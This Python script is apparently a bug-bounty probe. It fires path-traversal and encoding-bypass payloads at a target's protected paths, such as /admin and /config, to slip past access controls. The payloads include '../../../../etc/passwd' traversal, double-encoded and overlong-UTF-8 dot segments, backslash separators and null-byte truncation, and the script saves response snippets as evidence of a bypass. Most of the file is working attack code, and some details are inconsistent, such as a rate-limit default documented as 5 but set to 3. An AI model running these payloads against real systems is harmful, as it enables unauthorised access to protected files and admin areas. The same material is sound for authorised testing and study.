#!/usr/bin/env python3
"""
URL Parser Differential Probe — tests backend vs frontend URL parsing differences.
Backslash bypass, encoding confusion, double encoding, path normalization,
Unicode overlong UTF-8, case sensitivity, and null-byte truncation.
"""
import argparse
import json
import sys
import os
import re
import time
import urllib.parse
import requests

BACKSLASH_TESTS = [
    {"path": "$PROTECTED\\..\\public\\index.html", "name": "backslash_traversal_to_public", "encoding": "raw"},
    {"path": "\\$PROTECTED\\resource", "name": "backslash_as_path_separator", "encoding": "raw"},
    {"path": "\\api\\internal\\health", "name": "backslash_api_path", "encoding": "raw"},
]

ENCODING_TESTS = [
    {"path": "$PROTECTED%2Fconfig", "name": "encoded_slash_single", "encoding": "url"},
    {"path": "$PROTECTED%5Cconfig", "name": "encoded_backslash", "encoding": "url"},
    {"path": "$PROTECTED%252Fconfig", "name": "double_encoded_slash", "encoding": "url"},
    {"path": "$PROTECTED/..%252Fconfig", "name": "double_encoded_dot_dot_slash", "encoding": "url"},
    {"path": "%61dmin/config", "name": "encoded_first_char", "encoding": "url"},
    {"path": "admin/%252e%252e/config", "name": "double_encoded_dots", "encoding": "url"},
]

NORMALIZATION_TESTS = [
    {"path": "$PROTECTED/./config", "name": "single_dot_segment", "encoding": "raw"},
    {"path": "/./$PROTECTED/config", "name": "leading_dot_segment", "encoding": "raw"},
    {"path": "$PROTECTED/foo/../../config", "name": "parent_directory_traversal", "encoding": "raw"},
    {"path": "$PROTECTED/../../../../etc/passwd", "name": "deep_traversal_etc_passwd", "encoding": "raw"},
    {"path": "..;/..;/$PROTECTED", "name": "path_parameter_dot_dot", "encoding": "raw"},
    {"path": "$PROTECTED/..%00/config", "name": "dot_dot_null_byte", "encoding": "url"},
]

UNICODE_TESTS = [
    {"path": "/%c0%ae%c0%ae/$PROTECTED", "name": "overlong_utf8_dot_dot", "encoding": "raw"},
    {"path": "/%e0%80%ae%c0%ae/$PROTECTED", "name": "triple_byte_overlong_dot", "encoding": "raw"},
    {"path": "/%25c0%25ae%25c0%25ae/$PROTECTED", "name": "double_encoded_overlong", "encoding": "raw"},
    {"path": "/..%c0%af$PROTECTED", "name": "overlong_utf8_slash", "encoding": "raw"},
]

MISC_TESTS = [
    {"path": "$PROTECTED%00.html", "name": "null_byte_truncation", "encoding": "url"},
    {"path": "$PROTECTED;.js/config", "name": "path_parameter_separator", "encoding": "raw"},
    {"path": "$PROTECTED ;js/config", "name": "space_semicolon_extension", "encoding": "raw"},
]

CASE_TESTS = [
    {"path": "$PROTECTED_UPPER/config", "name": "uppercase_protected", "encoding": "raw"},
    {"path": "$PROTECTED_MIXED/config", "name": "mixed_case_protected", "encoding": "raw"},
]

ALL_TESTS = []


def load_context(context_path):
    if not context_path or not os.path.exists(context_path):
        return {}
    try:
        with open(context_path) as f:
            return json.load(f)
    except (json.JSONDecodeError, IOError) as e:
        print(f"[warn] Failed to load context: {e}", file=sys.stderr)
        return {}


def build_test_list(protected_paths):
    all_tests = []
    for p_path in protected_paths:
        p_stripped = p_path.strip("/")
        p_upper = p_stripped.upper()
        p_mixed = "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(p_stripped))

        for group in (BACKSLASH_TESTS, ENCODING_TESTS, NORMALIZATION_TESTS, UNICODE_TESTS, MISC_TESTS):
            for t in group:
                path = t["path"].replace("$PROTECTED", p_stripped)
                if t["encoding"] == "url":
                    all_tests.append({
                        **t,
                        "full_path": path,
                        "original_protected": p_path,
                    })
                else:
                    all_tests.append({
                        **t,
                        "full_path": path,
                        "original_protected": p_path,
                    })

        for ct in CASE_TESTS:
            path = ct["path"].replace("$PROTECTED_UPPER", p_upper).replace("$PROTECTED_MIXED", p_mixed)
            all_tests.append({
                **ct,
                "full_path": path,
                "original_protected": p_path,
            })

    return all_tests


def get_baseline(target, session, timeout):

    for p in ["/admin", "/config", "/api/internal", "/debug"]:
        try:
            resp = session.get(f"{target}{p}", timeout=timeout, allow_redirects=False)
            return {
                "path": p,
                "status": resp.status_code,
                "length": len(resp.text or ""),
                "headers": dict(resp.headers),
                "body_snippet": (resp.text or "")[:200],
            }
        except Exception:
            continue

    return {"path": "/admin", "status": 0, "length": 0}


def probe_diff(target, session, test_item, baseline, timeout, dry_run):
    result = {
        "test_name": test_item["name"],
        "test_path": test_item["full_path"],
        "original_protected": test_item.get("original_protected", ""),
        "status_code": 0,
        "baseline_status": baseline["status"],
        "response_length": 0,
        "baseline_length": baseline["length"],
        "bypass_detected": False,
        "bypass_reason": None,
        "evidence_snippet": None,
        "error": None,
        "dry_run": dry_run,
    }

    if dry_run:
        return result

    try:
        full_url = f"{target}/{test_item['full_path'].lstrip('/')}"
        start = time.time()
        resp = session.get(full_url, timeout=timeout, allow_redirects=False)
        elapsed = time.time() - start

        result["status_code"] = resp.status_code
        result["response_length"] = len(resp.text or "")
        result["time"] = round(elapsed, 3)

        baseline_len = baseline.get("length", 0)
        if baseline_len > 0 and result["status_code"] == resp.status_code == 200:
            body_len = len(resp.text or "")
            len_ratio = body_len / max(1, baseline_len)
            if 0.5 < len_ratio < 2.0:
                result["bypass_detected"] = True
                result["bypass_reason"] = f"Response length similar to baseline ({body_len} vs {baseline_len})"
                result["evidence_snippet"] = (resp.text or "")[:200]
                print(f"  [BYPASS] {test_item['name']} -> {test_item['full_path']} (status={resp.status_code} len={body_len})", file=sys.stderr)
                return result

        if resp.status_code == 200 and baseline.get("status") != 200:
            result["bypass_detected"] = True
            result["bypass_reason"] = f"Got 200 where baseline returned {baseline['status']}"
            result["evidence_snippet"] = (resp.text or "")[:200]
            print(f"  [BYPASS] {test_item['name']} -> {test_item['full_path']} (200 vs baseline {baseline['status']})", file=sys.stderr)
        elif resp.status_code == 200:
            result["evidence_snippet"] = (resp.text or "")[:200]
            print(f"  [?] {test_item['name']} -> {test_item['full_path']} (status={resp.status_code})", file=sys.stderr)
        else:
            print(f"  [-] {test_item['name']}: {resp.status_code}", file=sys.stderr)

    except requests.exceptions.Timeout:
        result["error"] = "timeout"
        print(f"  [timeout] {test_item['name']}", file=sys.stderr)
    except requests.exceptions.ConnectionError as e:
        result["error"] = f"connection: {e}"
    except Exception as e:
        result["error"] = str(e)

    return result


def main():
    parser = argparse.ArgumentParser(
        description="URL Parser Differential Probe — detect URL parsing mismatches between frontend and backend",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --target https://target.com --context .bb/context.json
  %(prog)s --target https://target.com --protected-paths /admin,/api/internal,/config --dry-run
  %(prog)s --target https://target.com --protected-paths /admin,/api --output findings.jsonl
        """,
    )
    parser.add_argument("--context", default=None, help="Path to context.json")
    parser.add_argument("--target", required=True, help="Target base URL (e.g. https://target.com)")
    parser.add_argument("--protected-paths", default="/admin,/api/internal,/config,/debug,/internal,/private", help="Comma-separated protected paths to probe against")
    parser.add_argument("--output", default=None, help="Output findings.jsonl path")
    parser.add_argument("--timeout", type=int, default=12, help="Request timeout in seconds (default: 12)")
    parser.add_argument("--rate-limit", type=int, default=3, help="Max requests per second (default: 5)")
    parser.add_argument("--dry-run", action="store_true", help="Print planned tests without executing")
    parser.add_argument("--proxy", default=None, help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--user-agent", default="URLParserDiff/1.0 (security research)", help="Custom User-Agent")
    parser.add_argument("--retries", type=int, default=2, help="Retries on failure (default: 2)")
    args = parser.parse_args()

    ctx = load_context(args.context)
    outdir = ctx.get("outdir", os.getcwd())
    evidence_dir = ctx.get("evidence_dir", os.path.join(outdir, "evidence"))
    os.makedirs(outdir, exist_ok=True)
    os.makedirs(evidence_dir, exist_ok=True)

    target = args.target.rstrip("/")
    if not target.startswith("http"):
        target = f"https://{target}"

    output_path = args.output
    if not output_path:
        output_path = os.path.join(outdir, "url_parser_differential_findings.jsonl")

    protected = [p.strip() for p in args.protected_paths.split(",") if p.strip()]
    all_tests = build_test_list(protected)
    print(f"[info] {len(all_tests)} parser differential tests across {len(protected)} protected paths", file=sys.stderr)

    if args.dry_run:
        for t in all_tests[:15]:
            print(f"[dry-run] GET {target}/{t['full_path']} ({t['name']})", file=sys.stderr)
        print(f"[dry-run] {len(all_tests)} total tests — output would go to {output_path}", file=sys.stderr)
        return

    session = requests.Session()
    session.headers.update({
        "User-Agent": args.user_agent,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    })
    if args.proxy:
        session.proxies = {"http": args.proxy, "https": args.proxy}
    adapter = requests.adapters.HTTPAdapter(max_retries=args.retries)
    session.mount("https://", adapter)
    session.mount("http://", adapter)

    baseline = get_baseline(target, session, args.timeout)
    print(f"[*] Baseline: {baseline['path']} -> status={baseline['status']}, len={baseline['length']}", file=sys.stderr)

    findings = []
    with open(output_path, "w") as outfile:
        for test_item in all_tests:
            result = probe_diff(target, session, test_item, baseline, args.timeout, dry_run=False)
            outfile.write(json.dumps(result) + "\n")
            findings.append(result)
            if args.rate_limit > 0:
                time.sleep(1.0 / max(1, args.rate_limit))

    bypasses = [f for f in findings if f.get("bypass_detected")]
    print(f"\n[done] {len(bypasses)}/{len(findings)} bypasses detected across {len(protected)} protected paths", file=sys.stderr)
    for b in bypasses:
        print(f"  [!] {b['test_name']}: {b['test_path']} ({b['bypass_reason']})", file=sys.stderr)
    print(f"[done] Findings written to {output_path}", file=sys.stderr)

    summary = {
        "total_tests": len(findings),
        "bypasses_detected": len(bypasses),
        "protected_paths": protected,
        "target": target,
        "output_path": output_path,
    }
    print(json.dumps(summary, indent=2), file=sys.stderr)


if __name__ == "__main__":
    main()